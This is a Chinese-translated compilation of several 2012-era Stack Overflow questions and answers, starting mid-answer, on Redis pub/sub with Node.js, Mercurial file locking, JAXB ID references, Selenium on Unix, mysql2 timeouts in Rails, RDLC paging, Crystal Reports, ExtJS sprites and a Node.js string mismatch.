首先，我有一个单页应用程序，所有流量都通过套接字，但这不是必需的。它也应该以您管理它的方式与会话一起使用。

在 nodejs onConnect 中，我询问后端用户是否已通过身份验证，然后将用户 ID 存储到套接字对象（socket.data）中，并填充哈希图以直接从用户 ID 查找套接字。

其次，我使用 Redis 并从 nodejs 订阅一个 redis 列表（[请参阅 redis pub/sub](http://redis.io/topics/pubsub/)）。php 后端使用用户 ID 推送此列表中的消息以寻址消息。nodejs 接收这个消息（例如一个新的新闻提要项），在提到的 hashmap 中查找用户 ID 并将其发送给客户端。所以，用户只能得到他被授权的东西。然后客户端决定如何处理该消息。如果用户在他的提要页面上，它可以添加该项目。如果用户在其他人的提要上，它可以简单地在页面的其他位置添加通知。它也可能会丢弃它。

在 php 后端站点上，每次发生需要在某些连接的客户端上实时显示的事件时，此消息都会发送到 redis。如果 user1 在 user2 的提要上发帖，则新项目将存储在数据库中，同时作为消息发送到 redis 队列。

该系统还有助于减少数据库负载，因为 nodejs 只需要查询数据库以确保连接的用户已经过身份验证。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-10-02T07:22:37.900

实际上，您可以避免使用 node.js，而使用[phpdaemon](http://daemon.io/)，它是用 php 编写的，并且工作得很好。

# android - 带有锁定文件的 Mercurial 替代方案

> ID：12192963
> 
> 赞同：2
> 
> 时间：2012-08-30T08:37:12.510
> 
> 标签：android, mercurial

我使用 Eclipse 为 Android 开发 Java。我已经安装了 Mercurial 来与其他程序员一起控制源文件。但是我不喜欢 mercurial 的工作方式，没有在有人修改文件时锁定文件的选项。我知道 mercurial 以这种方式工作，但我们更喜欢锁“方法”。除了带有锁定文件的 mercurial 之外，还有其他选择吗？有没有办法配置 Eclipse 以避免写入只读文件？如果我有一个只读源文件，我可以使用 Eclipse 打开它并在其中写入。

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-30T08:44:23.363

Mercurial[的引述：权威指南](http://hgbook.red-bean.com/read/mercurial-in-daily-use.html)：

> 例如，分布式修订控制系统就其性质而言不能提供文件锁定功能。因此，没有内置机制可以防止两个人对二进制文件进行冲突更改。如果您的团队可能有几个人经常编辑二进制文件，那么使用 Mercurial（或任何其他分布式修订控制系统）来管理这些文件可能不是一个好主意。

但是，在该段落的正下方，有一个您可以使用的扩展名的引用，名为“锁定/解锁扩展名”。快速搜索找到描述扩展[的页面](http://mercurial.selenic.com/wiki/LockExtension)，但我还没有使用它。链接页面还暗示存在另一个较旧的同名扩展。

最后一点，就个人而言，我同意书中的引述。如果您需要在工作流程中锁定文件或目录，尝试使用分布式版本控制系统只会给您带来问题。使用更传统的版本控制系统可能会更好。

# java - JAXB XmlIDREF 和地图/列表

> ID：12192964
> 
> 赞同：1
> 
> 时间：2012-08-30T08:37:12.883
> 
> 标签：java, xml, jaxb, jersey, unmarshalling

我有一个相当复杂的数据结构，我似乎无法正确解组。

```
@XmlRootElement
class Tree {
  @XmlID
  private String id;

  @XmlJavaTypeAdapter(type=TreeFooAdapter.class)
  Map<Tree, Foo> fooMap;
}

class Foo {
  @XmlID
  private String id;
} 
```

我有两棵独立的树。两个节点（每棵树一个）可以配对并与 Foo 的一个实例相关联。fooMap 用于跟踪给定树节点已与哪些其他节点配对，以及 Foo 结果的哪些实例。

TreeFooAdapter 非常简单，但请注意它使用 ID refs：

```
public class TreeFooAdapter extends XmlAdapter<TreeFooAdapter.MapType, Map<Tree, Foo>> {
  public static class MapType {
    public static class MapEntry {
      @XmlAttribute
      @XmlIDREF
      public Tree key;
      @XmlAttribute
      @XmlIDREF
      public Foo value;
    }
    // etc...
  }

  // Standard drill for marshal/unmarshal...
} 
```

**问题**：前向引用不起作用！解组时，无论哪个 Tree 在 XML 中最先出现，其 fooMap 中的键都为空。由于这两棵树相互引用，因此我无法更改 XML 的顺序来解决这个问题。

我尝试了一个 hack，其中我有一个私有方法来获取/设置 a `List<TreeFooMapEntry>`，但它产生了相同的结果。

为什么当它们包含在 Map 或 List 中时，JAXB 无法处理前向 ID 引用，我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T14:09:52.513

我尝试了另一种这次似乎可行的技巧。诀窍涉及以下内容：

*   创建将 fooMap 转换为 TreeFooAdapter.MapType 的私有 getter/setter 对
*   将 XmlID 添加到 TreeFooAdapter.MapType，并使用 XmlIDREF 注释 getter
*   维护一组静态的 TreeFooAdapter.MapType 实例
*   编组时，在编组 Tree 和 Foo 的所有实例之后，还要编组实例集。

这会产生更清晰的 XML：Trees 用简单的 IDREF 编组，用于它们的 fooMap，XML 文件的末尾只是一长串 TreeFooAdapter.MapTypes，它们本身就是成对的 IDREF 列表。如果您多次编组/解组，则必须小心清理静态实例集。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T14:54:59.710

我发现了一个（可怕的、可怕的、丑陋的）解决方法，受此[启发](https://stackoverflow.com/questions/7587095/can-jaxb-marshal-by-containment-at-first-then-marshal-by-xmlidref-for-subsequen)。我基本上概括了PhoneNumberAdapter 类来处理任何“可识别”，即具有唯一ID（即Foo 和Tree）。我没有一个 AdaptedPhoneNumber 类，而是有一个 ObjectWrapper bean，它要么包含被包装的实际对象（第一次遇到时），要么只包含它的 ID（在后续遇到时）。TreeFooAdapter 中的 MapEntry 类没有 XmlIDREF，而是将我的 IdentifiableAdapter 指定为 XmlJavaTypeAdapter。

这会创建可怕的、不可读的 XML，但至少它可以工作。尽管如此，这似乎是 JAXB 中的一个错误：经过一些痛苦的调试后，我仍然无法弄清楚为什么 XmlIDREF 在适应的 Map 类中不起作用。

# maven - Selenium 测试在 Unix 中失败

> ID：12192967
> 
> 赞同：1
> 
> 时间：2012-08-30T08:37:37.810
> 
> 标签：maven, selenium-rc

我正在尝试将 Selenium 测试集成到 Bamboo 中。我能够在 Windows 机器上调用测试，但是当我尝试在 Unix 服务器上复制相同的测试时，我收到以下错误：

```
*rror   29-Aug-2012 17:03:54    17:03:54.792 WARN - Caution: '/usr/bin/google-chrome': file is a script file, not a real executable.  The browser environment is no longer fully under RC control
build   29-Aug-2012 17:03:54    17:03:54.803 INFO - Launching Google Chrome...
build   29-Aug-2012 17:33:55    17:33:55.319 INFO - Killing Google Chrome...
build   29-Aug-2012 17:33:57    [INFO] ------------------------------------------------------------------------
build   29-Aug-2012 17:33:57    [INFO] BUILD FAILURE
build   29-Aug-2012 17:33:57    [INFO] ------------------------------------------------------------------------
build   29-Aug-2012 17:33:57    [INFO] Total time: 33:21.497s
build   29-Aug-2012 17:33:57    [INFO] Finished at: Wed Aug 29 17:33:57 BST 2012
build   29-Aug-2012 17:33:57    [INFO] Final Memory: 28M/164M
build   29-Aug-2012 17:33:57    [INFO] ------------------------------------------------------------------------
build   29-Aug-2012 17:33:57    [ERROR] Failed to execute goal org.codehaus.mojo:selenium-maven-plugin:2.3:selenese (test) on project iopscience-webapp: Execution test of goal org.codehaus.mojo:selenium-maven-plugin:2.3:selenese failed. SeleniumCommandTimedOutException -> [Help 1]* 
```

我正在使用 selenium-maven-plugin 运行 selenese 测试套装。以下是我的 pom.xml 的摘录

```
 <plugin>
               <groupId>org.codehaus.mojo</groupId>
               <artifactId>selenium-maven-plugin</artifactId>
               <version>2.3</version>
                 <configuration>
                   <browser>*googlechrome</browser>
                   <suite>Testsuite-UI.html</suite>
                   <startURL>http://localhost:8082/</startURL>
               </configuration>
               <executions>
                   <execution>
                       <id>test</id>
                       <phase>integration-test</phase>
                       <goals>
                           <goal>selenese</goal>
                       </goals>
                   </execution>
               </executions>
           </plugin> 
```

请让我知道是否需要在 Linux 上进行任何特定配置来运行测试套件？

# mysql - 检查mysql与远程主机的连接

> ID：12192974
> 
> 赞同：1
> 
> 时间：2012-08-30T08:38:14.070
> 
> 标签：mysql, ruby-on-rails, validation, activerecord, model

我有模型来存储数据库连接参数（主机、数据库名称、用户名、密码）并按表格填写。在创建或更新之前，我需要检查输入参数的连接是否良好。我创建`validate :check_connection`验证器：

```
# don`t change primary connection
class Remote < ActiveRecord::Base; end

def check_connection
  return if errors.any? || (!new_record? && password.empty?)
  begin
    Remote.establish_connection(
      adapter: 'mysql2',
      host: host,
      username: username,
      password: password,
      database: database,
      connect_timeout: 5,
      reconnect: false
    )
    # maybe need to make some sql request? did try it
  rescue Exception => e
    errors.add :connection, 'Could not connect to database'
  end
end 
```

当我尝试输入可访问主机 ( `localhost`) 时，上面的代码运行良好。但是，如果主机喜欢`192.168.1.1`（无法访问）页面在提交表单后冻结。我看到每秒都尝试连接，并且在浏览器上的 ESC（停止加载页面）之后它并没有停止（我看到网络接口上的 tcpdump 尝试）。尝试并没有停止..

那么，如何验证与数据库的连接？并且如果无法建立连接，页面一定不会长时间加载。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-09-13T11:52:38.523

变量`connect_timeout`是一个全局变量。因此，`mysql2`也许忽略它。

在 mysql5.6 上：

```
mysql[(none)]> set connect_timeout = 123;
ERROR 1229 (HY000): Variable 'connect_timeout' is a GLOBAL variable and should be set with SET GLOBAL 
```

我`timeout`在初始化 mysql2 时设置了变量，但没有反映。mysql2 的自述文件说您可以设置 *timeout 选项，但我认为自述文件已过时或损坏。

在 mysql2 0.3.14(gem) 上：

```
client =  Mysql2::Client.new(
  host: 'localhost',
  database: 'test',
  username: 'root',
  password: '',
  connect_timeout: 3,
  read_timeout: 3,
  write_timeout: 3,
  wait_timeout: 3);

client.query('show variables like "%timeout%"').map{|r| [r["Variable_name"], r["Value"]] }

=> [["connect_timeout", "10"],
 ["delayed_insert_timeout", "300"],
 ["innodb_lock_wait_timeout", "50"],
 ["innodb_rollback_on_timeout", "OFF"],
 ["interactive_timeout", "28800"],
 ["lock_wait_timeout", "31536000"],
 ["net_read_timeout", "30"],  # Maybe older mysql has read_timeout?
 ["net_write_timeout", "60"], # Maybe older mysql has write_timeout?
 ["slave_net_timeout", "3600"],
 ["wait_timeout", "28800"]] 
```

如果使用`ActiveRecord`，则只能设置`wait_timeout`变量 by `database.yml`。

在 database.yml 中：

```
development:
  adapter: mysql2
  encoding: utf8
  charset: utf8
  database: test
  pool: 5
  username: root
  password: 
  host: localhost
  connect_timeout: 3
  read_timeout: 3
  write_timeout: 3
  wait_timeout: 3 
```

ActiveRecord 4.0.1 的结果：

```
> ActiveRecord::Base.connection.execute('show variables like "%timeout%"').to_a
=> [["connect_timeout", "10"],
 ["delayed_insert_timeout", "300"],
 ["innodb_flush_log_at_timeout", "1"],
 ["innodb_lock_wait_timeout", "50"],
 ["innodb_rollback_on_timeout", "OFF"],
 ["interactive_timeout", "28800"],
 ["lock_wait_timeout", "31536000"],
 ["net_read_timeout", "30"],
 ["net_write_timeout", "60"],
 ["rpl_stop_slave_timeout", "31536000"],
 ["slave_net_timeout", "3600"],
 ["wait_timeout", "3"]] 
```

ActiveRecord 中设置`wait_timeout`变量`abstract_mysql_adapter.rb`。

看：

abstract_mysql_adapter.rb [https://github.com/rails/rails/blob/master/activerecord/lib/active_record/connection_adapter/abstract_mysql_adapter.rb](https://github.com/rails/rails/blob/master/activerecord/lib/active_record/connection_adapters/abstract_mysql_adapter.rb)

mysql2_adapter.rb [https://github.com/rails/rails/blob/master/activerecord/lib/active_record/connection_adapter/mysql2_adapter.rb](https://github.com/rails/rails/blob/master/activerecord/lib/active_record/connection_adapters/mysql2_adapter.rb)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T11:04:58.983

我确实使用`gem 'mysql2'`并捆绑安装了 0.3.11 版本。此版本忽略`connect_timeout`并在较新版本中修复了错误。在我尝试 0.3.12b4 ( `gem 'mysql2', '~> 0.3.12b4'`) 后一切正常。

# reportviewer - 如果数据更多，则 RDLC 报告在其他页面上显示数据

> ID：12192978
> 
> 赞同：1
> 
> 时间：2012-08-30T08:38:34.333
> 
> 标签：reportviewer, rdlc

我在winforms中有一个使用reportviewer并在其中显示rdlc报告的账单应用程序，我现在有一个主报告和一个子报告，问题是当我有少于40个项目时，它显示报告很好，但如果它不止于此数据来自下一页，请参阅报告和我们的输入

主要报告 ![主要 RDLC 报告](../Images/276dbe2a6fba6eb53e8861851de71079.png)

子报告 ![在此处输入图像描述](../Images/cea3b1c0a27a1078879c0e4f8ffc626e.png)

25条记录时正常显示 ![25条记录时正常显示](../Images/6e3d38adb3a55acdf26961decae261fc.png)

当它是 40 条记录时 pg1 ![40条记录时](../Images/58b2eff5ef39c34fe26de09ced3feb77.png)

第二页 ![第二页](../Images/5f8a2893cb2ee0fa8d2377b686f99189.png)

任何帮助都会得到帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T10:52:21.373

尝试取消选中`Keep together on one page if possible`选项`Page break options.`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T18:49:52.807

我用的是vs2010，貌似你是08的？所以它可能会有点不同，但我会试一试（主要是因为我也在寻求一些帮助，而且我知道当没有很多针对特定问题的“质量”答案时使用它是多么令人沮丧）。

在子报表 rdlc 文件中，确保“PageBreak”属性（在包含您的列的表上）未设置为“start”。我只是将其设置为“无”。

我相信正在发生的事情是它正在将其移至下一页，因为它不适合第一页。您可以尝试解决的问题是将主报告中的所有内容包含在一个矩形中（在矩形中，设置 pagebreak = none，并且 keeptogether=true [我不确定您是否真的想要 keeptogether=true...如果它通过调整大小将所有内容压缩到一页上，则将其设置为 false]）。

希望我有所帮助

# intellitrace - 在哪里下载 Fabrikam Fiber 呼叫中心代码库？

> ID：12192984
> 
> 赞同：3
> 
> 时间：2012-08-30T08:38:49.747
> 
> 标签：intellitrace

我正在尝试为 Fabrikam 光纤呼叫中心下载 Asp.Net 应用程序。Larry Guger 在[http://channel9.msdn.com/Events/TechEd/NorthAmerica/2012/DEV365](http://channel9.msdn.com/Events/TechEd/NorthAmerica/2012/DEV365)上 关于“Visual Studio 2012 生产中的高级 IntelliTrace”的演示中使用了它。这将是一个很大的帮助，因为它是一次尝试所有新的 VS 2012 功能的完美代码库。

如果这不是提出这个问题的正确论坛，请提出建议。

谢谢您的帮助。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-04T21:37:29.590

您可以从此处下载 Fabrikam Fiber 演示应用程序[http://vsarguidance.codeplex.com/downloads/get/379895](http://vsarguidance.codeplex.com/downloads/get/379895)

ALM 护林员角色和场景包含 fabrikam fiber 演示应用程序的下载。

您也可以从此处下载包含实验室和所有先决条件的 VS 20120 ALM VM，[http://blogs.msdn.com/b/briankel/archive/2011/09/16/visual-studio-11-application -lifecycle-management-virtual-machine-and-hands-on-labs-demo-scripts.aspx](http://blogs.msdn.com/b/briankel/archive/2011/09/16/visual-studio-11-application-lifecycle-management-virtual-machine-and-hands-on-labs-demo-scripts.aspx)

# visual-studio-2010 - 如何在 Visual Studio 2010 的工具箱中取消隐藏 Crystal Report Viewer？

> ID：12192987
> 
> 赞同：1
> 
> 时间：2012-08-30T08:38:56.597
> 
> 标签：visual-studio-2010, crystal-reports, toolbox

我有带有 SAP Crystal Report 的 Visual Studio 2010，但在 Visual Studio 的工具箱中看不到 Crystal Report Viewer 项。如何取消隐藏或添加该工具箱项？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T09:05:05.830

转到 Project/Properties 并在 Target Framework 上的下拉列表中选择 .NET Framework 4。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-05-23T06:09:53.577

您需要首先将您的框架更改***为 .net Framwork 4.0*** 链接[http://www.aspsnippets.com/Articles/Crystal-Report-Viewer-missing-from-ToolBox-in-Visual-Studio-2010.aspx](http://www.aspsnippets.com/Articles/Crystal-Report-Viewer-missing-from-ToolBox-in-Visual-Studio-2010.aspx)**您也可以创建运行时的水晶报表...**

 ****```
[In VB.Net]

Imports CrystalDecisions.Windows.Forms

Private Sub CrystalView_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
    Try
        Dim crv As New CrystalReportViewer
        With crv
            .Dock = DockStyle.Fill
        End With
        Me.Controls.Add(crv)
    Catch ex As Exception
        MsgBox(ex.Message)
    End Try
End Sub

[In C#]
using CrystalDecisions.Windows.Forms;
public class CrystalView
{
    private void CrystalView_Load(System.Object sender, System.EventArgs e)
    {
        try {
            CrystalReportViewer crv = new CrystalReportViewer();
             crv.Dock = DockStyle.Fill;
            crv.EnableDrillDown = false;
            this.Controls.Add(crv);
        } catch (Exception ex) {
            MessageBox.Show(ex.Message,"Hello");
        }
    }
    public CrystalView()
    {
        Load += CrystalView_Load;
    }
} 
```

在您的 WinForm Crystal Report Viewer 中是可见的...****

# css - 在 extjs 中使用 Sprite

> ID：12192994
> 
> 赞同：2
> 
> 时间：2012-08-30T08:39:28.983
> 
> 标签：css, extjs, extjs4, sprite

我目前正在开展一个项目，我们在 1 个 sprite 文件中收到了所有图标。我从未使用过精灵（而且我对 extjs 还很陌生）我找不到一个像样的示例来说明如何将以下代码（使用 1 个 upload.png）转换为使用精灵文件（icons.png）

```
{
    xtype: 'actioncolumn',
    cls: 'tasks-icon-column-header tasks-upload-column-header',
    width: 24,
    icon: 'images/upload.png',
    iconCls: 'x-hidden',
    tooltip: 'Upload',
    menuDisabled: true,
    sortable: false
    handler: Ext.bind(me.handleUploadClick, me)
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-05T10:38:21.483

您需要在 css 文件中定义类，并在 sprite 中定义图标的背景图像和位置。例如，如果您有这样的图标[，](http://start.ubuntu.com/12.04/sprite.png)请执行以下操作来定义您的类并仅显示 google 图标：

```
.google_icon {
    background:url(http://start.ubuntu.com/12.04/sprite.png) -10px -310px;
    height:38px;
}​ 
```

并在你的代码中使用这个类，如下所示：

```
iconCls: 'google_icon', 
```

您还需要删除此行：

```
icon: 'images/upload.png' 
```

我希望它有帮助！

# javascript - Nodejs：对字符串的响应文件与返回字符串不同

> ID：12192999
> 
> 赞同：0
> 
> 时间：2012-08-30T08:39:49.200
> 
> 标签：javascript, jquery, node.js

因此，当我尝试来自 nodejs 的以下两个响应时，浏览器中的行为是不同的，特别是 chrome。我有一个只有以下内容的文件 SOMESTRING

```
var string = fs.readSync(filename,'ascii');
res.end(string); 
```

VS。

```
res.end('SOMESTRING'); 
```

在前端我使用 jQuery 并执行以下操作。

```
$.ajax({type: params.type,
                    url: 'ajaxrequest',
                    cache: false,
                    data: {"name":"value"},
                    dataType:'text',
                    error: function(jqXHR, textStatus, errorThrown) {

                    },
                    success: function(data, textStatus, jqXHR) {
                            if(data == 'SOMESTRING')
                               console.log('data == SOMESTRING');
                    }
   }); 
```

无论编码是什么（utf8 等）或尝试 string.toString() 我都无法获取 data == 'SOMESTRING' 即使我只是 res.end('SOMESTRING') 平等工作得很好。是的，我确信没有额外的空格或回车。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T08:55:06.673

试试`console.log('[' + data + ']');`。我敢打赌你会在那里找到一个换行符。